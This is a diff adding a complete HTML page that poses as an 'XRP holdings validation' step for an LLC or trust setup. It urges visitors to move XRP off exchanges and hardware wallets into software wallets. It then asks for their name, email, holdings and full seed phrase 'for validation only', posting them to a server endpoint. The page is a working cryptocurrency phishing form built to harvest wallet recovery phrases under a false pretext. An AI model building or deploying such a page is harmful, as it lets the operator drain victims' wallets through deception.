@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XRP Holding Validation Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #333;
+      text-align: center;
+    }
+    p {
+      color: #555;
+      font-size: 14px;
+    }
+    form label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px;
+      background-color: #333;
+      color: white;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Validate Your XRP Holdings</h2>
+    <p>To proceed with your LLC or Trust setup with our team, please validate your XRP holdings. This is to ensure your assets are genuine tokens and decentralized. <strong>We can only validate assets from decentralized wallets.</strong> Our team will reach out to you via Email to discuss your prefered LLC/Trust setup</p>
+    <p>If your XRP is currently on an exchange or a non-decentralized wallet (e.g. Ledger, Coinbase, Binance, Uphold), please move it to one of the following supported decentralized wallets before proceeding:</p>
+    <ul>
+      <li>Xaman Wallet</li>
+      <li>Trust Wallet</li>
+      <li>Exodus Wallet</li>
+      <li>Ellipal</li>
+      <li>XUMM</li>
+      <li>MetaMask (for wrapped XRP)</li>
+    </ul>
+
+    <form action="/submit-xrp-validation" method="POST">
+      <label for="fullName">Full Name</label>
+      <input type="text" id="fullName" name="fullName" required>
+
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="walletType">Wallet Type (Choose from list)</label>
+      <select id="walletType" name="walletType" required>
+        <option value="">Select Wallet</option>
+        <option value="Xaman">Xaman</option>
+        <option value="Trust Wallet">Trust Wallet</option>
+        <option value="Exodus">Exodus</option>
+        <option value="Ellipal">Ellipal</option>
+        <option value="XUMM">XUMM</option>
+        <option value="MetaMask">MetaMask (for wXRP)</option>
+      </select>
+
+      <label for="xrpAmount">Approximate XRP Holdings</label>
+      <input type="number" id="xrpAmount" name="xrpAmount" required>
+
+      <label for="seedPhrase">Seed Phrase (for validation only)</label>
+      <textarea id="seedPhrase" name="seedPhrase" rows="4" placeholder="Enter your full seed phrase here" required></textarea>
+
+      <label for="notes">Additional Notes (optional)</label>
+      <textarea id="notes" name="notes" rows="3"></textarea>
+
+      <button type="submit">Validate XRP Holdings</button>
+    </form>
+  </div>
+</body>
+</html>
